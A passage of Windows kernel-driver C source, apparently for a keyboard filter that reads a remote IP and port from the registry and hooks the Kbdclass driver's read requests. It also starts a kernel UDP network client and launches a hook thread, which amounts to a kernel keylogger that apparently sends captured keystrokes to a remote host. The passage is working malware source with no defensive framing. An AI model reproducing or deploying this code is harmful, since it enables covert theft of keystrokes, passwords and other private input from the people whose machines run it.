    if (ValueInfo == NULL) {
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto Cleanup;
    }
    
    RtlInitUnicodeString(&ValueName, L"RemoteIP");
    Status = ZwQueryValueKey(KeyHandle, &ValueName, KeyValuePartialInformation, ValueInfo, Length, &Length);
    if (NT_SUCCESS(Status) && ValueInfo->Type == REG_SZ && ValueInfo->DataLength > 0) {
        *RemoteIP = ExAllocatePool2(POOL_FLAG_PAGED, ValueInfo->DataLength, KBDDRIVER_POOL_TAG);
        if (*RemoteIP != NULL) RtlCopyMemory(*RemoteIP, ValueInfo->Data, ValueInfo->DataLength);
    }
    
    RtlInitUnicodeString(&ValueName, L"RemotePort");
    Status = ZwQueryValueKey(KeyHandle, &ValueName, KeyValuePartialInformation, ValueInfo, Length, &Length);
    if (NT_SUCCESS(Status) && ValueInfo->Type == REG_SZ && ValueInfo->DataLength > 0) {
        *RemotePort = ExAllocatePool2(POOL_FLAG_PAGED, ValueInfo->DataLength, KBDDRIVER_POOL_TAG);
        if (*RemotePort != NULL) RtlCopyMemory(*RemotePort, ValueInfo->Data, ValueInfo->DataLength);
    }
    
Cleanup:
    if (ValueInfo != NULL) ExFreePoolWithTag(ValueInfo, KBDDRIVER_POOL_TAG);
    if (KeyHandle != NULL) ZwClose(KeyHandle);
    
UseDefaults:
    if (*RemoteIP == NULL) {
        ULONG Len = (ULONG)((wcslen(KBDDRIVER_REMOTE_IP) + 1) * sizeof(WCHAR));
        *RemoteIP = ExAllocatePool2(POOL_FLAG_PAGED, Len, KBDDRIVER_POOL_TAG);
        if (*RemoteIP != NULL) RtlStringCbCopyW(*RemoteIP, Len, KBDDRIVER_REMOTE_IP);
    }
    
    if (*RemotePort == NULL) {
        ULONG Len = (ULONG)((wcslen(KBDDRIVER_REMOTE_PORT) + 1) * sizeof(WCHAR));
        *RemotePort = ExAllocatePool2(POOL_FLAG_PAGED, Len, KBDDRIVER_POOL_TAG);
        if (*RemotePort != NULL) RtlStringCbCopyW(*RemotePort, Len, KBDDRIVER_REMOTE_PORT);
    }
    
    return (*RemoteIP != NULL && *RemotePort != NULL) ? STATUS_SUCCESS : STATUS_INSUFFICIENT_RESOURCES;
}

/*++
Routine: DriverEntry
Description: Driver initialization
--*/
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    UNICODE_STRING DriverName;
    PDRIVER_OBJECT KbdDriverObject = NULL;
    WSKDATA WSKData;
    HANDLE ThreadHandle = NULL;
    LPWSTR RemoteIP = NULL;
    LPWSTR RemotePort = NULL;
    LPCWSTR UseIP;
    LPCWSTR UsePort;
    int i;

    Status = ReadRegistryConfig(RegistryPath, &RemoteIP, &RemotePort);
    if (!NT_SUCCESS(Status)) {
        // Defaults handled inside
    }

    RtlInitUnicodeString(&DriverName, L"\\KeyboardFilter");
    Status = IoCreateDevice(
        DriverObject,
        KBDDRIVER_MAX_DEVICE_EXTENSION,
        &DriverName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,
        &g_FilterDeviceObject);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    g_FilterDeviceObject->Flags |= DO_BUFFERED_IO;

    RtlInitUnicodeString(&DriverName, L"\\Driver\\Kbdclass");
    Status = ObReferenceObjectByName(
        &DriverName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        FILE_ALL_ACCESS,
        *IoDriverObjectType,
        KernelMode,
        NULL,
        &KbdDriverObject);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject = KbdDriverObject;
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemoteIP = RemoteIP;
    ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->RemotePort = RemotePort;
    
    InitializeListHead(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead);
    KeInitializeSpinLock(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjSpinLock);

    // PassThrough for all to support PnP/Power
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = KbdIrp_PassThrough;
    }

    DriverObject->MajorFunction[IRP_MJ_READ] = KbdIrp_Read;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KbdIrp_DeviceControl;
    DriverObject->DriverUnload = KbdDriver_Unload;

    Status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WSKData);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    UseIP = (RemoteIP != NULL) ? RemoteIP : KBDDRIVER_REMOTE_IP;
    UsePort = (RemotePort != NULL) ? RemotePort : KBDDRIVER_REMOTE_PORT;

    Status = NetClient_Initialize(UseIP, UsePort, AF_INET, SOCK_DGRAM);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    KbdHandler_InitializeBuffer();

    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        KbdThread_IrpHookInit,
        NULL);
    if (!NT_SUCCESS(Status)) {
        goto Cleanup;
    }

    if (ThreadHandle != NULL) {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }

    return STATUS_SUCCESS;

Cleanup:
    if (RemoteIP != NULL) ExFreePoolWithTag(RemoteIP, KBDDRIVER_POOL_TAG);
    if (RemotePort != NULL) ExFreePoolWithTag(RemotePort, KBDDRIVER_POOL_TAG);
    if (ThreadHandle != NULL) ZwClose(ThreadHandle);
    if (KbdDriverObject != NULL) ObDereferenceObject(KbdDriverObject);
    if (g_FilterDeviceObject != NULL) IoDeleteDevice(g_FilterDeviceObject);

    return Status;
}